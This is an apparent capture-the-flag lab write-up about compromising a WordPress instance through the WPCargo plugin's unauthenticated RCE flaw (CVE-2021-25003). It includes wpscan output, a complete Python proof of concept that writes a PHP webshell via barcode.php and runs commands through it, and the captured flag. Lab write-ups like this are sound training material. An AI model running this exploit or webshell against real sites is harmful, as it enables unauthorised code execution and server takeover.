Being that this is a wordpress site, I'm going to immediately start with a wpscan:
`wpscan --url http://83.136.251.237:39562/ --enumerate --api-token <token from wpscan.com>  -o wpscan.log`

Reviewing the output, one vulnerability that jumps out to me is CVE-2021-25003 (CVSS 10.0), Unauthenticated RCE (Remote Code Execution) introduced by the WPCargo plugin. 

```
...
[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://83.136.251.237:39562/wp-content/plugins/wpcargo/
 | Last Updated: 2024-08-08T17:00:00.000Z
 | [!] The version is out of date, the latest version is 7.0.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: WPCargo < 6.9.0 - Unauthenticated RCE
 |     Fixed in: 6.9.0
 |     References:
 |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003
 ...
```

Following the first reference link to https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/ I copied the PoC Python script, modify the "destination_url" variable to the target, and tried running it to gain RCE. However, I only recieved:
```
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.24.0</center>
</body>
</html>
```

I wonder if the webshell isn't being created in the first place? It might be that since the script is trying to write to /var/www/html and failing, the directory doesn't exist or isn't valid for the application.

Since we have access to the source code, I checked the Dockerfile and found that the application is actually running out of /var/www/wordpress. By changing the exploit script to write to this directory instead, I was able to gain RCE.

Also by inspecting the Dockerfile, we know the flag will be at /flag.txt, so we can cat this file and finish the room.
```Python
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://83.136.251.237:39562/'
cmd = 'cat /flag.txt'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.

requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/wordpress/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

`HTB{th3_cms_th3_myth_th3_l3g3nd_b2e1da2a106ee4276417da8ea5386eb5}`